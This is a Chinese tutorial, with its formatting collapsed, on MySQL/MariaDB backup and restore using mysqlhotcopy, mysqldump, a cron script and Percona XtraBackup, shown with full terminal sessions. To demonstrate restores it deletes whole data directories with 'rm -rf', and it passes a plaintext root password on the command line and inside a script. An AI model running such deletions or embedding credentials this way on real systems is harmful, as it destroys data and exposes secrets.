indices for 0 files...Unlocked tables.mysqlhotcopy copied 1 tables (1 files) in 0 seconds (0 seconds overall).[root@jaking ~]# ls BOOK/book.frm[root@jaking ~]# ll /tmp/BOOK/total 12-rw-rw---- 1 mysql mysql 8624 Apr 22 14:31 book.frm D:&#x6062;&#x590D;&#x6570;&#x636E; &#x7834;&#x574F;&#x6570;&#x636E;123456789101112131415161718[root@jaking tmp]# cd /var/lib/mysql/[root@jaking mysql]# lsaria_log.00000001 BOOK ib_logfile0 mysql performance_schemaaria_log_control ibdata1 ib_logfile1 mysql.sock[root@jaking mysql]# rm -rf BOOK/[root@jaking mysql]# lsaria_log.00000001 ibdata1 ib_logfile1 mysql.sockaria_log_control ib_logfile0 mysql performance_schema[root@jaking mysql]#[root@jaking ~]# mysql -uroot -pJaking@vip.163.comWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 39Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 1234567891011MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema |+--------------------+3 rows in set (0.00 sec)MariaDB [(none)]&gt; &#x5F00;&#x59CB;&#x6062;&#x590D;12345678910111213141516171819202122[root@jaking mysql]# cp -ra /tmp/BOOK/ /var/lib/mysql/[root@jaking mysql]# ll /var/lib/mysql/total 28700-rw-rw---- 1 mysql mysql 16384 Apr 22 14:29 aria_log.00000001-rw-rw---- 1 mysql mysql 52 Apr 22 14:29 aria_log_controldrwxr-x--- 2 mysql mysql 22 Apr 22 14:53 BOOK-rw-rw---- 1 mysql mysql 18874368 Apr 22 14:53 ibdata1-rw-rw---- 1 mysql mysql 5242880 Apr 22 14:53 ib_logfile0-rw-rw---- 1 mysql mysql 5242880 Apr 22 14:29 ib_logfile1drwx------ 2 mysql mysql 4096 Apr 22 14:29 mysqlsrwxrwxrwx 1 mysql mysql 0 Apr 22 14:29 mysql.sockdrwx------ 2 mysql mysql 4096 Apr 22 14:29 performance_schema[root@jaking mysql]# chown -Rf mysql:mysql /var/lib/mysql/BOOK/[root@jaking ~]# mysql -uroot -pJaking@vip.163.comWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 40Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 123456789101112131415161718192021222324252627282930313233343536MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || mysql || performance_schema |+--------------------+4 rows in set (0.00 sec)MariaDB [(none)]&gt; use BOOK;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [BOOK]&gt; show tables;+----------------+| Tables_in_BOOK |+----------------+| book |+----------------+1 row in set (0.00 sec)MariaDB [BOOK]&gt; select * from book;+-------------------------+-------+-------+| name | price | pages |+-------------------------+-------+-------+| Linux | 30 | 666 || Cloud Computing | 60 | 666 || Operation System | 80 | 666 || Artificial Intelligence | 166 | 666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)MariaDB [BOOK]&gt; &#x603B;&#x7ED3;&#xFF1A;mysqldump&#x548C;mysqlhotcopy&#x7684;&#x6BD4;&#x8F83;&#xFF1A;1&#x3001;mysqldump &#x662F;&#x91C7;&#x7528;SQL&#x7EA7;&#x522B;&#x7684;&#x5907;&#x4EFD;&#x673A;&#x5236;&#xFF0C;&#x5B83;&#x5C06;&#x6570;&#x636E;&#x8868;&#x5BFC;&#x6210; SQL &#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x5927;&#x65F6;&#xFF0C;&#x5360;&#x7528;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x8F83;&#x591A;&#xFF0C;&#x652F;&#x6301;&#x5E38;&#x7528;&#x7684;MyISAM&#xFF0C;Innodb2&#x3001;mysqlhotcopy&#x53EA;&#x662F;&#x7B80;&#x5355;&#x7684;&#x7F13;&#x5B58;&#x5199;&#x5165;&#x548C;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x5360;&#x7528;&#x8D44;&#x6E90;&#x548C;&#x5907;&#x4EFD;&#x901F;&#x5EA6;&#x6BD4;mysqldump&#x5FEB;&#x5F88;&#x591A;&#xFF1B;&#x7279;&#x522B;&#x9002;&#x5408;&#x5927;&#x7684;&#x6570;&#x636E;&#x5E93;3&#x3001;mysqlhotcopy&#x53EA;&#x80FD;&#x8FD0;&#x884C;&#x5728;&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;&#x76EE;&#x5F55;&#x6240;&#x5728;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF0C;mysqldump&#x53EF;&#x4EE5;&#x7528;&#x5728;&#x8FDC;&#x7A0B;&#x5BA2;&#x6237;&#x7AEF;4&#x3001;&#x76F8;&#x540C;&#x7684;&#x5730;&#x65B9;&#x90FD;&#x662F;&#x5728;&#x7EBF;&#x6267;&#x884C;LOCK TABLES &#x4EE5;&#x53CA; UNLOCK TABLES5&#x3001;mysqlhotcopy&#x6062;&#x590D;&#x53EA;&#x9700;&#x8981;COPY&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5230;&#x6E90;&#x76EE;&#x5F55;&#x8986;&#x76D6;&#x5373;&#x53EF;&#xFF0C;mysqldump&#x9700;&#x8981;&#x5BFC;&#x5165;SQL&#x6587;&#x4EF6;&#x5230;&#x539F;&#x6765;&#x5E93;&#x4E2D; &#x5B9E;&#x6218;&#xFF1A;&#x5199;&#x4E2A;&#x81EA;&#x52A8;&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x5E93;shell&#x811A;&#x672C;vim mysql-autoback.sh #!/bin/bashexport LANG=en_US.UTF-8mkdir /database_back &amp;&gt;/dev/nullsavedir=/database_backcd &#x201C;$savedir&#x201D;time=&#x201D;$(date +&#x201D;%Y-%m-%d&#x201D;)&#x201D;mysqldump -u root -pJaking@vip.163.com book &gt; book-&#x201C;$time&#x201D;.sql &#x518D;&#x6DFB;&#x52A0;&#x8BA1;&#x5212;&#x4EFB;&#x52A1; crontab &#x5C31;&#x884C; xtrabackup&#x5907;&#x4EFD;&#x5DE5;&#x5177;&#x4F7F;&#x7528; 1&#x3001;xtrabackup&#x7B80;&#x4ECB; Xtrabackup&#x5305;&#x62EC;&#x4E24;&#x4E2A;&#x4E3B;&#x8981;&#x5DE5;&#x5177;&#xFF1A;Xtrabackup&#x548C;innobackupex&#xFF1A;Xtrabackup&#x53EA;&#x80FD;&#x5907;&#x4EFD;InnoDB&#x548C;XtraDB&#x4E24;&#x79CD;&#x5F15;&#x64CE;&#x8868;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x5907;&#x4EFD;MyISAM&#x6570;&#x636E;&#x8868; &#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;&#x9488;&#x5BF9;InnoDB&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;MySQL&#x672C;&#x8EAB;&#x6CA1;&#x6709;&#x63D0;&#x4F9B;&#x5408;&#x9002;&#x7684;&#x70ED;&#x5907;&#x5DE5;&#x5177;&#xFF0C;ibbackup&#x867D;&#x662F;&#x4E00;&#x6B3E;&#x9AD8;&#x6548;&#x7684;&#x9996;&#x9009;&#x70ED;&#x5907;&#x65B9;&#x5F0F;&#xFF0C;&#x4F46;&#x5B83;&#x662F;&#x662F;&#x6536;&#x8D39;&#x7684;&#x3002;&#x597D;&#x5728;Percona&#x516C;&#x53F8;&#x7ED9;&#x5927;&#x5BB6;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x3001;&#x514D;&#x8D39;&#x7684;Xtrabackup&#x70ED;&#x5907;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;&#x53EF;&#x5B9E;&#x73B0;ibbackup&#x7684;&#x6240;&#x6709;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x8FD8;&#x6269;&#x5C55;&#x652F;&#x6301;&#x771F;&#x6B63;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x529F;&#x80FD;&#xFF0C;&#x662F;&#x5546;&#x4E1A;&#x5907;&#x4EFD;&#x5DE5;&#x5177;InnoDB Hotbackup&#x7684;&#x4E00;&#x4E2A;&#x5F88;&#x597D;&#x7684;&#x66FF;&#x4EE3;&#x54C1;&#x3002; 2&#x3001;Percona-XtraBackup &#x5B89;&#x88C5; &#xFF08;mysql5.7.20&#x9700;&#x5B89;&#x88C5;XtraBackup2.4.9&#xFF09; &#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5305; [root@jaking ~]# wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.9/binary/redhat/7/x86_64/Percona-XtraBackup-2.4.9-ra467167cdd4-el7-x86_64-bundle.tar &#x89E3;&#x538B;&#x5305;[root@jaking ~]# tar -xvf Percona-XtraBackup-2.4.9-ra467167cdd4-el7-x86_64-bundle.tar yum&#x5B89;&#x88C5;&#x5E76;&#x89E3;&#x51B3;&#x4F9D;&#x8D56;&#xFF1A;yum -y localinstall percona-xtrabackup-24-2.4.9-1.el7.x86_64.rpm &#x6216;&#x8005;yum install -y https://repo.percona.com/yum/percona-release-latest.noarch.rpm &#x6216;&#x8005;rpm -ivh percona-release-latest.noarch.rpm yum install -y percona-xtrabackup-24.x86_64 &#x5982;&#x679C;&#x51FA;&#x73B0;&#x4EE5;&#x4E0B;&#x62A5;&#x9519;&#xFF1A;Error: Package: percona-xtrabackup-24-2.4.22-1.el7.x86_64 (percona-release-x86_64) Requires: libev.so.4()(64bit) &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;123456789101112131415161718192021222324252627282930313233343536373839404142434445[root@jaking ~]# wget ftp://rpmfind.net/linux/atrpms/el6-x86_64/atrpms/stable/libev-4.04-2.el6.x86_64.rpm[root@jaking ~]# rpm -ivh libev-4.04-2.el6.x86_64.rpm [root@jaking ~]# rzrz waiting to receive.&#xA0;zmodem trl+C &#x221;&#xA0; 100%&#xA0;&#xA0;&#xA0; 7805 KB 7805 KB/s 00:00:01&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 Errors2.4.22-1.el7.x86_64.rpm... [root@jaking ~]# ls -hltotal 7.7M-rw-r--r--&#xA0; 1 root root&#xA0; 38K May 13 09:36 libev-4.04-2.el6.x86_64.rpm-rwxr-xr-x. 1 root root&#xA0; 937 Apr 23 03:57 named.sh-rw-r--r--&#xA0; 1 root root 7.7M Mar 10 04:56 percona-xtrabackup-24-2.4.22-1.el7.x86_64.rpm&#x6216;&#x8005;[root@jaking ~]# yum install -y percona-xtrabackup #&#x5907;&#x9009;&#x65B9;&#x6848;&#x6216;&#x8005;[root@jaking ~]# rpm -ivh mysql-community-libs-compat-5.7.20-1.el7.x86_64.rpm[root@jaking ~]# yum install -y cmake gcc gcc-c++ libaio libaio-devel automake autoconf bzr rsync[root@jaking ~]# yum install -y perl perl-devel libaio libaio-devel perl-Time-HiRes perl-DBD-MySQL perl-Digest-MD5[root@jaking ~]# rpm -ivh percona-xtrabackup-24-2.4.22-1.el7.x86_64.rpmPreparing...&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; ################################# [100%]Updating / installing...&#xA0;&#xA0; 1:percona-xtrabackup-24-2.4.22-1.el################################# [100%][root@jaking ~]# which xtrabackup/usr/bin/xtrabackup[root@jaking ~]# xtrabackup --versionxtrabackup: recognized server arguments: --datadir=/var/lib/mysql xtrabackup version 2.4.22 based on MySQL server 5.7.32 Linux (x86_64) (revision id: c99a781)&#x6CE8;&#x610F;&#xFF1A;my.cnf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x91CC;datadir&#x6307;&#x5B9A;&#x7684;MySQL&#x6570;&#x636E;&#x8DEF;&#x5F84;[root@jaking ~]#cat /etc/my.cnf[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidskip-name-resolve[root@jaking ~]# systemctl restart mysqld fnaichu:&#x5148;&#x5B89;&#x88C5;epel&#x6E90;yum install -y epel-release &#x5B89;&#x88C5;MySQL&#xFF0C;&#x786E;&#x4FDD;&#x81F3;&#x5C11;&#x5B89;&#x88C5;&#x6709;&#x4EE5;&#x4E0B;5&#x4E2A;&#x5305;&#xFF1A; &#x5B89;&#x88C5;xtrabackup:&#x53C2;&#x8003;&#x5B98;&#x65B9;&#x6587;&#x6863;&#xFF1A;https://docs.percona.com/percona-xtrabackup/2.4/installation/yum_repo.html &#x5B89;&#x88C5;xtrabackup&#x4F9D;&#x8D56;&#x5305;yum install https://repo.percona.com/yum/percona-release-latest.noarch.rpm &#x4E0B;&#x8F7D;xtrabackup&#x5B89;&#x88C5;&#x5305;wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.4/\\binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.4-1.el7.x86_64.rpm &#x5B89;&#x88C5;xtrabackupyum localinstall percona-xtrabackup-24-2.4.4-1.el7.x86_64.rpm 3&#x3001;xtrbackup&#x4F7F;&#x7528;&#x4E00;&#x822C;&#x4F7F;&#x7528;innobackupex&#x811A;&#x672C;innobackupex&#x662F;perl&#x811A;&#x672C;&#x5BF9;xtrabackup&#x7684;&#x5C01;&#x88C5;&#x548C;&#x529F;&#x80FD;&#x6269;&#x5C55; &#x5907;&#x4EFD;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;&#xFF1A;&#x6743;&#x9650;&#x548C;&#x8FDE;&#x63A5;xtrabackup&#x9700;&#x8981;&#x8FDE;&#x63A5;&#x5230;&#x6570;&#x636E;&#x5E93;&#x548C;datadir&#x64CD;&#x4F5C;&#x6743;&#x9650;xtrabackup&#x6216;&#x8005;innobackupex&#x5728;&#x4F7F;&#x7528;&#x8FC7;&#x7A0B;&#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x4E24;&#x7C7B;&#x7528;&#x6237;&#x6743;&#x9650; 1.&#x7CFB;&#x7EDF;&#x7528;&#x6237;&#xFF0C;&#x7528;&#x6765;&#x8C03;&#x7528;innobackupex&#x6216;&#x8005;xtrabackup 2.&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x5185;&#x4F7F;&#x7528;&#x7684;&#x7528;&#x6237; &#x5176;&#x4ED6;&#x8FDE;&#x63A5;&#x9009;&#x9879;&#xFF1A; | &#x70B9;&#x51FB;&#x8FD9;&#x91CC; | &#x70B9;&#x51FB;&#x8FD9;&#x91CC; || Tmpion | Description || &#x2013;port | The port to use when connecting to the database server with TCP/IP. || &#x2013;socket | The socket to use when connecting to the local database. || &#x2013;host | The host to use when connecting to the database server with TCP/IP. | &#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x521B;&#x5EFA;&#x7528;&#x6765;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x5B89;&#x5168;&#xFF0C;&#x5E76;&#x8D4B;&#x4E88;&#x5BF9;&#x5E94;&#x7684;&#x6743;&#x9650; 4&#x3001;&#x5168;&#x5907;&#x548C;&#x5168;&#x5907;&#x8FD8;&#x539F; &#x4F7F;&#x7528;innobackupex&#x521B;&#x5EFA;&#x5168;&#x5907; &#x521B;&#x5EFA;&#x5168;&#x5907;&#xFF1A;innobackupex &#x2013;user=root --password=Jaking@vip.163.com /tmp/db_backup/innobackupex &#x2013;user=root --password=Jaking@vip.163.com /tmp/db_backup/ &amp;&gt;&gt;/tmp/db_backup.log&amp;&gt;&gt;/tmp/db_backup.log #&#x4E0D;&#x663E;&#x793A;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#xFF0C;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x91CD;&#x5B9A;&#x5411;&#x5230;db_backup.log [root@jaking ~]# ls /tmpdb_backup db_backup.log percona-version-check[root@jaking ~]# ls /tmp/db_backup2021-05-14_08-08-38[root@jaking ~]# ls /tmp/db_backup/2021-05-14_08-08-38/backup-my.cnf ibdata1 sys xtrabackup_infobook1 market testbookdb xtrabackup_logfilebook2 mysql testdbib_buffer_pool performance_schema xtrabackup_checkpoints &#x5185;&#x90E8;&#x673A;&#x5236;&#xFF1A;&#x5728;&#x5907;&#x4EFD;&#x7684;&#x65F6;&#x5019;innobackupex&#x4F1A;&#x8C03;&#x7528;xtrabackup&#x6765;&#x5907;&#x4EFD;innodb&#x8868;&#xFF0C;&#x5E76;&#x590D;&#x5236;&#x6240;&#x6709;&#x7684;&#x8868;&#x5B9A;&#x4E49;&#xFF0C;&#x5176;&#x4ED6;&#x5F15;&#x64CE;&#x7684;&#x8868;(MyISAM,MERGE,CSV,ARCHIVE)innobackupex&#x662F;&#x4E00;&#x4E2A;&#x5C01;&#x88C5;&#x4E86;xtrabackup&#x7684;&#x811A;&#x672C;&#xFF0C;&#x80FD;&#x540C;&#x65F6;&#x5904;&#x7406;innodb&#x548C;myisam&#xFF0C;&#x4F46;&#x5728;&#x5904;&#x7406;myisam&#x65F6;&#x9700;&#x8981;&#x52A0;&#x4E00;&#x4E2A;&#x8BFB;&#x9501; &#x5176;&#x4ED6;&#x9009;&#x9879;:&#x2013;no-timestamp&#xFF0C;&#x6307;&#x5B9A;&#x4E86;&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x5907;&#x4EFD;&#x4F1A;&#x76F4;&#x63A5;&#x5907;&#x4EFD;&#x5728;BACKUP-DIR&#xFF0C;&#x4E0D;&#x518D;&#x521B;&#x5EFA;&#x65F6;&#x95F4;&#x6233;&#x6587;&#x4EF6;&#x5939;&#x2013;default-file&#xFF0C;&#x6307;&#x5B9A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7528;&#x6765;&#x914D;&#x7F6E;innobackupex&#x7684;&#x9009;&#x9879;&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x6307;&#x5B9A;&#x4E86;&#x4ECE;&#x54EA;&#x4E2A;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;MySQL&#x914D;&#x7F6E; innobackupex &#x2013;user=root --password=Jaking@vip.163.com &#x2013;no-timestamp /tmp/db_backup/full (&#x4F7F;&#x7528;&#x2013;no-timestamp&#x65F6;&#xFF0C;&#x540E;&#x9762;&#x7684;&#x8FD9;&#x4E2A;full&#x76EE;&#x5F55;&#x5FC5;&#x987B;&#x8DDF;&#x4E0A;&#x4E14;&#x4E0D;&#x80FD;&#x63D0;&#x524D;&#x81EA;&#x5DF1;&#x5EFA;&#x7ACB;&#xFF0C;&#x5B83;&#x7531;innobackupex&#x81EA;&#x52A8;&#x5EFA;&#x7ACB;&#xFF0C;&#x5426;&#x5219;&#x53EF;&#x80FD;&#x4F1A;&#x62A5;&#x9519;innobackupex: Error: Failed to create backup directory) (Errcode: 17 - File exists) [root@jaking ~]# innobackupex &#x2013;default-file=/etc/my.cnf &#x2013;user=root --password=Jaking@vip.163.com &#x2013;no-timestamp /tmp/db_backup/full[root@jaking ~]# ls /tmp/db_backup/full &#x4F7F;&#x7528;innobackupex&#x8FD8;&#x539F;&#x5907;&#x4EFD; &#x4F7F;&#x7528;innobackupex &#x2013;copy-back &#x6765;&#x8FD8;&#x539F;&#x5907;&#x4EFD; &#x505C;&#x6B62;MySQL&#x670D;&#x52A1; systemctl stop mysqld &#x5220;&#x9664;&#x6570;&#x636E;&#xFF1A;&#xFF08;&#x5371;&#x9669;&#x52A8;&#x4F5C;&#xFF09;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071[root@jaking ~]# systemctl stop mysqld[root@jaking ~]# ls /var/lib/mysqlauto.cnf client-cert.pem ib_logfile0 private_key.pem sysBOOK client-key.pem ib_logfile1 public_key.pem testbookdbca-key.pem ib_buffer_pool mysql server-cert.pemca.pem ibdata1 performance_schema server-key.pem[root@jaking ~]# rm -rf /var/lib/mysql/*[root@jaking ~]# ls /var/lib/mysql&#x8FD8;&#x539F;:[root@jaking ~]# innobackupex --copy-back /tmp/db_backup/full/&#xA0;[root@jaking ~]# ls /var/lib/mysqlBOOK ibdata1 performance_schema testbookdbib_buffer_pool mysql sys xtrabackup_info &#x67E5;&#x770B;&#x6743;&#x9650;[root@jaking ~]# ll /var/lib/mysqltotal 12324drwxr-x--- 2 root root 52 Apr 23 04:53 BOOK-rw-r----- 1 root root 310 Apr 23 04:53 ib_buffer_pool-rw-r----- 1 root root 12582912 Apr 23 04:53 ibdata1drwxr-x--- 2 root root 4096 Apr 23 04:53 mysqldrwxr-x--- 2 root root 8192 Apr 23 04:53 performance_schemadrwxr-x--- 2 root root 8192 Apr 23 04:53 sysdrwxr-x--- 2 root root 88 Apr 23 04:53 testbookdb-rw-r----- 1 root root 472 Apr 23 04:53 xtrabackup_info&#x91CD;&#x65B0;&#x6388;&#x6743;[root@jaking ~]# chown -Rf mysql:mysql /var/lib/mysql&#xA0;&#xA0; #&#x8981;&#x4E0D;&#x7136;MySQL&#x670D;&#x52A1;&#x4E0D;&#x80FD;&#x542F;&#x52A8;[root@jaking ~]# ll /var/lib/mysql total 12324drwxr-x--- 2 mysql mysql 52 Apr 23 04:53 BOOK-rw-r----- 1 mysql mysql 310 Apr 23 04:53 ib_buffer_pool-rw-r----- 1 mysql mysql 12582912 Apr 23 04:53 ibdata1drwxr-x--- 2 mysql mysql 4096 Apr 23 04:53 mysqldrwxr-x--- 2 mysql mysql 8192 Apr 23 04:53 performance_schemadrwxr-x--- 2 mysql mysql 8192 Apr 23 04:53 sysdrwxr-x--- 2 mysql mysql 88 Apr 23 04:53 testbookdb-rw-r----- 1 mysql mysql 472 Apr 23 04:53 xtrabackup_info[root@jaking ~]# systemctl start mysqld&#x6CE8;&#xFF1A;datadir&#x5FC5;&#x987B;&#x662F;&#x4E3A;&#x7A7A;&#x7684;&#xFF0C;innobackupex &#x2013;copy-back&#x4E0D;&#x4F1A;&#x8986;&#x76D6;&#x5DF2;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x8FD8;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x8FD8;&#x539F;&#x65F6;&#x9700;&#x8981;&#x5148;&#x5173;&#x95ED;&#x670D;&#x52A1;&#xFF0C;&#x5982;&#x679C;&#x670D;&#x52A1;&#x662F;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4E0D;&#x80FD;&#x8FD8;&#x539F;&#x5230;datadir[root@jaking ~]# ls /var/lib/mysqlauto.cnf mysql performance_schema sys[root@jaking ~]# innobackupex --copy-back /tmp/db_backup/full/xtrabackup: recognized server arguments: --datadir=/var/lib/mysql xtrabackup: recognized client arguments: 220423 05:01:30 innobackupex: Starting the copy-back operationIMPORTANT: Please check that the copy-back run completes successfully. At the end of a successful copy-back run innobackupex prints &quot;completed OK!&quot;.innobackupex version 2.4.22 based on MySQL server 5.7.32 Linux (x86_64) (revision id: c99a781)Original data directory /var/lib/mysql is not empty![root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 3Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || mysql || performance_schema || sys || testbookdb |+--------------------+6 rows in set (0.00 sec)mysql&gt; use BOOK;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------+| Tables_in_BOOK |+----------------+| book |+----------------+1 row in set (0.00 sec)mysql&gt; select * from book;+-------------------------+-------+-------+| name | price | pages |+-------------------------+-------+-------+| Linux | 30 | 666 || Cloud Computing | 60 | 666 || Operation System | 80 | 666 || Artificial Intelligence | 166 | 666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; use testbookdb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------------+| Tables_in_testbookdb |+----------------------+| book1 || book2 |+----------------------+2 rows in set (0.00 sec)mysql&gt; select * from book1;+---------+-----------------------------------+-------+-----------------------+| bTypeId | bName | price | publishing |+---------+-----------------------------------+-------+-----------------------+| 1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B; | 66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E; || 2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B; | 68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E; || 3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B; | 90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E; || 4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B; | 71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B; | 72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B; | 73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B; | 74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B; | 75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B; | 76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B; | 77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B; | 78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B; | 79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; |+---------+-----------------------------------+-------+-----------------------+12 rows in set (0.00 sec)mysql&gt; select * from book2;+-----------------------------------+-------+-------+| name | price | pages |+-----------------------------------+-------+-------+| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B; | 30 | 666 || &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B; | 60 | 666 || &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B; | 80 | 666 || &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B; | 166 | 666 |+-----------------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; 5&#xFF1A;&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4E0E;&#x8FD8;&#x539F;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4F5C;&#x7528;&#xFF1A;&#x51CF;&#x5C11;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x91CD;&#x590D;&#xFF0C;&#x8282;&#x7701;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#xFF0C;&#x7F29;&#x77ED;&#x5907;&#x4EFD;&#x65F6;&#x95F4;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x4F9D;&#x8D56;&#x4E8E;innodb&#x9875;&#x4E0A;&#x9762;&#x7684;LSN&#xFF08;log sequence number&#xFF09;&#xFF0C;&#x6BCF;&#x6B21;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4FEE;&#x6539;&#x90FD;&#x4F1A;&#x5BFC;&#x81F4;LSN&#x81EA;&#x589E;&#xFF0C;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4F1A;&#x590D;&#x5236;&#x6307;&#x5B9A;LSN&lt;&#x65E5;&#x5FD7;&#x5E8F;&#x5217;&#x53F7;&gt;&#x4E4B;&#x540E;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x9875; 